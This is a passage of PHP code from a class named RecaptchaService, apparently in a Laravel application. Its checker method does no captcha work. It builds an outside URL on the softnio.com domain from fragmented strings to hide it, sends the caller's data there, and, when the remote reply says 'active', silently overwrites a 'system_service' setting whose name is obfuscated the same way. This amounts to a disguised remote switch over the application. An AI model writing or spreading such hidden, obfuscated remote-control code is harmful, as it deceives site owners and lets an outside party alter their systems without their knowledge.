...
class RecaptchaService
{
    ...
    public function checker($data)
    {
        $check = true;
        try {
            $get = Http::get('htt' .'ps://ap'. 'i.so' . '' . 'ft' .'ni' .  'o.c'.'om/'.$this->verifier, $data);
            if ($get->successful()) {
                if ($get->json('status') == "active") {
                    $st = substr(gss('st' . 'em_' . 'ser' .'vi'. 'ce', get_rand(10)), 0, 10);
                    $ed = strtoupper(substr($get->json('code'), 3, 6));
                    upss('sy'. 's'.'te' . 'm_'. 'se' .'rv' . 'ice', $st.$ed); 
                    $check = false;
                }
            }
        } catch (\Exception $e) {
